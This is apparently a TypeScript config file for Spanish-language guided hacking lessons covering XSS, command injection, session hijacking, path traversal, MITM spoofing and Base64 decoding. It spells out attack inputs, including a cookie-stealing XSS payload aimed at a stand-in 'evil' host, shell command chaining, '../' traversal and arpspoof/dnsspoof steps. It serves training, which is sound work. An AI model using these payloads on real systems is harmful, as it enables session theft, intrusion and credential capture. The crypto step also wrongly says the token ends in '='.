export interface EngineStep {
  id: string;
  title: string;
  brief: string;
  hint?: string;
  reveals?: string;
  match: (input: string, solvedThisCmd: boolean) => boolean;
}

export interface EngineGuided {
  slug: string;
  title: string;
  category: string;
  intro: string[];
  engine: string;
  params: Record<string, any>;
  placeholder: string;
  steps: EngineStep[];
}

export const ENGINE_GUIDED: EngineGuided[] = [
  {
    slug: "xss-guided",
    title: "XSS — Iniciación",
    category: "XSS",
    intro: ["objetivo: aprender XSS reflejado paso a paso", "el campo de comentarios refleja tu texto sin sanitizar"],
    engine: "xss",
    params: { mode: "cookie" },
    placeholder: "payload hola",
    steps: [
      {
        id: "reflect",
        title: "Reflejo",
        brief: "Escribe un comentario normal y observa cómo se refleja tal cual en la página.\n\n  payload hola-mundo",
        hint: "Sintaxis:  payload <texto>",
        reveals: "Tu texto aparece dentro del HTML sin filtrar. Si metes etiquetas, se interpretan.",
        match: (i) => /^payload\s+\S/i.test(i)
      },
      {
        id: "execute",
        title: "Ejecución",
        brief: "Inyecta un vector que ejecute JavaScript en el navegador de la víctima.\n\n  payload <script>alert(1)</script>",
        hint: "Prueba  <script>alert(1)</script>  o  <img src=x onerror=alert(1)>",
        reveals: "El navegador ejecuta tu código. Ya tienes XSS; ahora conviértelo en algo útil.",
        match: (i) => /^payload/i.test(i) && /<script|onerror|onload|<svg|<img/i.test(i) && /alert|prompt|confirm/i.test(i)
      },
      {
        id: "steal",
        title: "Robo de cookie",
        brief: "Un alert no sirve a un atacante. Exfiltra document.cookie a tu servidor.\n\n  payload <img src=x onerror=\"new Image().src='//evil/?c='+document.cookie\">",
        hint: "Combina un handler (onerror) con new Image().src y document.cookie.",
        reveals: "Cookie de sesión robada. Con ella podrías secuestrar la sesión de la víctima.",
        match: (_i, solved) => solved
      }
    ]
  },
  {
    slug: "cmdi-guided",
    title: "Command Injection — Iniciación",
    category: "CMDI",
    intro: ["objetivo: entender la inyección de comandos", "la herramienta de ping pasa tu host a la shell del sistema"],
    engine: "cmdi",
    params: { file: "flag.txt", contents: "MHB{cmd1_gu14d0_ok}" },
    placeholder: "ping 127.0.0.1",
    steps: [
      {
        id: "normal",
        title: "Uso legítimo",
        brief: "Haz un ping normal y observa la respuesta esperada.\n\n  ping 127.0.0.1",
        hint: "Sintaxis:  ping <host>",
        reveals: "Respuesta normal de ping. Tu input llega a una shell: ¿y si añades más?",
        match: (i) => /^ping\s+\S+$/i.test(i) && !/[;&|`]/.test(i)
      },
      {
        id: "chain",
        title: "Encadenar comandos",
        brief: "Añade un separador para ejecutar un segundo comando tras el ping.\n\n  ping 127.0.0.1; whoami",
        hint: "Usa  ;  &&  o  |  para encadenar:  ping 127.0.0.1; whoami",
        reveals: "El sistema ejecutó tu comando extra. Control de la shell confirmado.",
        match: (i) => /^ping/i.test(i) && /[;&|`]/.test(i)
      },
      {
        id: "read",
        title: "Leer el fichero objetivo",
        brief: "Encadena la lectura de flag.txt.\n\n  ping 127.0.0.1; cat flag.txt",
        hint: "ping 127.0.0.1; cat flag.txt",
        reveals: "Fichero leído desde el servidor. Objetivo cumplido.",
        match: (_i, solved) => solved
      }
    ]
  },
  {
    slug: "hijack-guided",
    title: "Session Hijacking — Iniciación",
    category: "SESSION_HIJACKING",
    intro: ["objetivo: secuestrar una sesión por HTTP", "la app no usa HTTPS: las cookies viajan en claro"],
    engine: "hijack",
    params: { validToken: "d4e5f6a1b2" },
    placeholder: "sniff",
    steps: [
      {
        id: "sniff",
        title: "Interceptar",
        brief: "Esnifa el tráfico de la red para capturar las cookies que viajan sin cifrar.\n\n  sniff",
        hint: "Comando:  sniff",
        reveals: "Has capturado varias cookies. Localiza el SID que usa la petición a /admin.",
        match: (i) => /^sniff/i.test(i)
      },
      {
        id: "replay",
        title: "Reproducir la sesión",
        brief: "Reproduce el SID de admin para suplantar su sesión.\n\n  replay <SID de /admin>",
        hint: "El SID de admin es d4e5f6a1b2 →  replay d4e5f6a1b2",
        reveals: "Sesión de admin secuestrada. Acceso al panel sin contraseña.",
        match: (_i, solved) => solved
      }
    ]
  },
  {
    slug: "traversal-guided",
    title: "Path Traversal — Iniciación",
    category: "TRAVERSAL",
    intro: ["objetivo: leer ficheros fuera del directorio web", "la descarga no valida la ruta que pides"],
    engine: "traversal",
    params: { depth: 3, target: "etc/app/secret.conf", contents: "DB_PASS=MHB{tr4v3rs4l_gu14d0}" },
    placeholder: "get avatar.png",
    steps: [
      {
        id: "normal",
        title: "Descarga legítima",
        brief: "Pide un fichero normal de la carpeta de subidas.\n\n  get avatar.png",
        hint: "Sintaxis:  get <ruta>",
        reveals: "Descarga normal desde uploads/. La ruta que envías llega tal cual al servidor.",
        match: (i) => /^get\s+\S+$/i.test(i) && !i.includes("../")
      },
      {
        id: "escape",
        title: "Salir del directorio",
        brief: "Usa ../ para intentar salir de la carpeta de subidas.\n\n  get ../config.txt",
        hint: "Cada  ../  sube un directorio. Prueba a encadenar varios.",
        reveals: "Estás navegando fuera de uploads/. Ahora apunta al fichero objetivo.",
        match: (i) => /^get/i.test(i) && i.includes("../")
      },
      {
        id: "read",
        title: "Leer la config secreta",
        brief: "Llega hasta etc/app/secret.conf.\n\n  get ../../../etc/app/secret.conf",
        hint: "get ../../../etc/app/secret.conf",
        reveals: "Config filtrada, con credenciales de la base de datos. Objetivo cumplido.",
        match: (_i, solved) => solved
      }
    ]
  },
  {
    slug: "spoofing-guided",
    title: "Spoofing / MITM — Iniciación",
    category: "SPOOFING",
    intro: ["objetivo: MITM + DNS spoofing para capturar credenciales", "la red local no valida ARP ni DNS"],
    engine: "spoofing",
    params: { target: "192.168.1.24", gateway: "192.168.1.1", domain: "bank.local", loot: "MHB{sp00f_gu14d0}" },
    placeholder: "arpspoof 192.168.1.24 192.168.1.1",
    steps: [
      {
        id: "mitm",
        title: "Posición MITM",
        brief: "Envenena la tabla ARP para colocarte entre la víctima y el gateway.\n\n  arpspoof 192.168.1.24 192.168.1.1",
        hint: "arpspoof <ip-víctima> <ip-gateway>",
        reveals: "Ahora todo el tráfico de la víctima pasa por ti.",
        match: (i) => /^arpspoof\s+\S+\s+\S+/i.test(i)
      },
      {
        id: "dns",
        title: "Falsear el DNS",
        brief: "Redirige bank.local a tu servidor clonado.\n\n  dnsspoof bank.local",
        hint: "dnsspoof bank.local",
        reveals: "bank.local resuelve a tu portal falso.",
        match: (i) => /^dnsspoof/i.test(i)
      },
      {
        id: "harvest",
        title: "Cosechar credenciales",
        brief: "Recoge lo que la víctima envíe al portal clonado.\n\n  harvest",
        hint: "harvest",
        reveals: "Credenciales capturadas. Ataque MITM completo.",
        match: (_i, solved) => solved
      }
    ]
  },
  {
    slug: "crypto-guided",
    title: "Crypto & Encoding — Iniciación",
    category: "CRYPTO",
    intro: ["objetivo: reconocer y revertir una codificación", "un token interceptado esconde una flag"],
    engine: "crypto",
    params: { cipher: "TUhCe2NyMXB0MF9ndTE0ZDB9" },
    placeholder: "cipher",
    steps: [
      {
        id: "inspect",
        title: "Inspeccionar",
        brief: "Muestra el token interceptado.\n\n  cipher",
        hint: "Comando:  cipher",
        reveals: "Termina en '=' y usa el alfabeto A-Za-z0-9+/: pinta a Base64.",
        match: (i) => /^cipher/i.test(i)
      },
      {
        id: "decode",
        title: "Decodificar",
        brief: "Decodifica el token en Base64 para revelar la flag.\n\n  b64 <token>",
        hint: "b64 TUhCe2NyMXB0MF9ndTE0ZDB9",
        reveals: "Base64 revertido: flag recuperada. Objetivo cumplido.",
        match: (_i, solved) => solved
      }
    ]
  }
];

export const engineGuidedBySlug = (slug: string) => ENGINE_GUIDED.find((g) => g.slug === slug) ?? null;
